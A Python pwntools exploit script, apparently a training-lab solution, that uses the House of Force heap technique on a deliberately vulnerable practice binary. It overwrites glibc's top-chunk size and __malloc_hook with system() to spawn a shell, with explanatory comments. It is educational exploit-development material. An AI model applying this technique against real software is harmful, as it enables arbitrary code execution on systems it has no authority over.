#!/usr/bin/python3
"""
Demonstrates code execution using the House of Force technique.

Run with GDB and/or NOASLR options like so:
    `python soln.py [GDB, NOASLR]`
"""

from pwn import *

context.terminal = ["wezterm", "start", "--"]

elf = context.binary = ELF(b"house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again


def start():
    gs = """
    set solib-search-path /home/pwent/code/personal/Linux_ED/HeapLAB/HeapLAB/.glibc/glibc_2.28_no-tcache
    set sysroot /home/pwent/code/personal/Linux_ED/HeapLAB/HeapLAB/.glibc/
    continue
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xFFFFFFFFFFFFFFFF - x) + y


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Our House of Force primitive to overwrite the top chunk's size field.
malloc(24, b"Y" * 24 + p64(0xFFFFFFFFFFFFFFFF))
pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size

# The distance to `libc`'s `__malloc_hook`; the (after the heap).
#
# Calculate the distance to just before `libc's` `__malloc_hook` function
# pointer in GLIBC. Note GLIBC's `__malloc_hook` is in its .data section in the
# libraries map after the heap:
#
#   |Application|
#   |Heap       |
#   |Libraries  |
#   |Stack      |
#
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

# Write `"/bin/sh\0"` at the start of our large (2nd) allocation; this acts as
# a scratch buffer on the heap (since we're using the heap, why not).
# `"/bin/sh\0"` lands at `heap + 0x30`, the first quadword of user data
# belonging to the 2nd chunk.
malloc(
    distance,
    b"/bin/sh\0",
)

# The next allocation overwrites `__malloc_hook` with `system`'s address.
malloc(24, p64(libc.sym.system))

cmd = heap + 0x30  # The `"bin/sh\0"` string we stored on the heap.

# Now `malloc` triggers `__malloc_hook`, which we've overwritten with `system()`.
# So calling `malloc` with the first argument (`size`) set to the address of
# `"/bin/sh\0"` causes `system("/bin/sh")` to execute, spawning a shell.
malloc(cmd, "")

# So, unlike in a stack-based ROP where we overwrite the return address and
# manually set up registers like rdi, here we're overwriting a function pointer
# (__malloc_hook) with the address of system(). When we later call malloc(), it
# indirectly calls system(), and the size argument we pass to malloc() becomes
# the first argument to system() - thanks to the standard calling convention.

# =============================================================================

io.interactive()
